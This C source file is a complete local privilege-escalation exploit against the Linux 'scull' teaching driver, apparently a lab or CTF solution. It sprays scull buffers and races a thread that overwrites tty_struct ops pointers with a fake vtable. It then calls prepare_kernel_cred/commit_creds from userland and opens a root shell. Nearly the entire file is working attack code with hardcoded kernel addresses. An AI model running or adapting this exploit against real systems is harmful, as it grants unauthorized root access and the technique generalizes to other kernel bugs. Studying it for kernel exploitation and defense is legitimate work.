#include "scull.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define success(f) assert((f) == 0)
#define N_TTY 0x100
#define N_SHIFT 768
int *ttyfds = NULL;
long *fake_vtable = NULL;
void lpe()
{
	__asm__(".intel_syntax noprefix;");
	__asm__("movabs rax, 0xffffffff810c3bd0;"); //prepare_kernel_creds
	__asm__("xor rdi, rdi;");
	__asm__("call rax; mov rdi, rax;");
	__asm__("movabs rax, 0xffffffff810c3860;"); //commit_creds
	__asm__("call rax");
	__asm__(".att_syntax;");
}
void allocate_ttys()
{
	for (int i = 0; i < N_TTY; i++)
	{
		ttyfds[i] = open("/dev/ptmx", O_RDWR);
	}
	puts("[*] TTYs allocation completed");
}
void release_ttys()
{
	for (int i = 0; i < N_TTY; i++)
	{
		close(ttyfds[i]);
	}
}
void set_quantum(int fd, int quantum)
{
	assert(fd >= 0);
	success(ioctl(fd, SCULL_IOCSQUANTUM, &quantum));
}
int get_quantum(int fd)
{
	assert(fd >= 0);
	int result = 0;
	success(ioctl(fd, SCULL_IOCGQUANTUM, &result));
	return result;
}
void overwrite_handler()
{
	puts("exiting overwrite thread");
	pthread_exit(0);
}
void overwrite(void *arg)
{
	int fd = (int)arg;
	assert(fd >= 0);
	signal(SIGUSR1, overwrite_handler);
	long *buffer = calloc(1024, 1);
	memset(buffer, 0x41, 1024);
	long *fake = calloc(1024, 1);
	memset(fake, 0x41, 1024);
	while (1)
	{
		success(lseek(fd, 0, SEEK_SET));
		for (int i = 0; i < 0x1000 * 0x100; i++)
		{
			assert(-1 != lseek(fd, (1024) * i, SEEK_SET));
			if (32 == read(fd, buffer, 32))
			{
				if (*(int *)buffer == 0x5401)
				{
					//puts("Found TTY_MAGIC");
					assert(-1 != lseek(fd, (1024) * i, SEEK_SET));
					buffer[3] = fake_vtable;

					write(fd, buffer, 32);
				}
			}
		}
	}
}
int main()
{
	fake_vtable = calloc(0x100, 1);
	fake_vtable[0] = 0xffffffff81650590;
	fake_vtable[1] = 0xffffffff81650ff0;
	fake_vtable[2] = 0xffffffff81650910;
	fake_vtable[3] = 0xffffffff816504c0;
	fake_vtable[4] = 0xffffffff816512b0;
	fake_vtable[6] = 0xffffffff816508f0;
	fake_vtable[7] = 0xffffffff81650860;
	fake_vtable[10] = 0xffffffff81650b70;
	fake_vtable[11] = 0xffffffff816504b0;
	fake_vtable[12] = 0xffffffff81651160;
	fake_vtable[13] = 0xffffffff81651210;
	fake_vtable[16] = 0xffffffff81650830;
	fake_vtable[21] = 0xffffffff81651230;
	fake_vtable[12] = lpe; //0x4141414141414141;
	int fd = open("/dev/scull", O_RDWR);
	set_quantum(fd, 1024);
	close(fd);

	fd = open("/dev/scull", O_WRONLY); //Important: scull_trim
	close(fd);

	fd = open("/dev/scull", O_RDWR);
	assert(get_quantum(fd) == 1024);
	void *buffer = calloc(1024, 1000);
	memset(buffer, 0x41, 1024);
	puts("[*] Allocating buffers");
	for (int i = 0; i < 1000 * 0x100; i++)
	{
		//printf("[*] Allocating buffer number %d...\n", i);
		assert(1024 == write(fd, buffer, 1024));
		assert(-1 != lseek(fd, -1024, SEEK_CUR));
		assert(1024 == read(fd, buffer, 1024));
		assert(*(char *)buffer == 0x41);
	}
	success(lseek(fd, 0, SEEK_SET));

	ttyfds = calloc(N_TTY, sizeof(int));
	int fd2 = open("/dev/scull", O_RDWR);
	puts("[*] Starting overwriting thread");
	pthread_t wt, at;
	pthread_create(&wt, 0, overwrite, fd);
	puts("[*] Starting reallocating thread");
	pthread_create(&at, 0, allocate_ttys, fd);

	puts("[*] Triggering");
	ioctl(fd2, SCULL_IOCSHIFT, N_SHIFT);

	sleep(3);
	puts("[*] Stopping overwriting thread");
	pthread_kill(wt, SIGUSR1);
	puts("[*] Obtaining kernel code execution");

	for (int i = 0; i < N_TTY; i++)
	{
		ioctl(ttyfds[i], 0x4242424242424242, 0x4343434343434343);
	}
	printf("UID: %d\n", getuid());
	puts("[*] Closing");
	close(fd2);
	close(fd);
	release_ttys();
	if (getuid() == 0)
		system("/bin/sh");
}
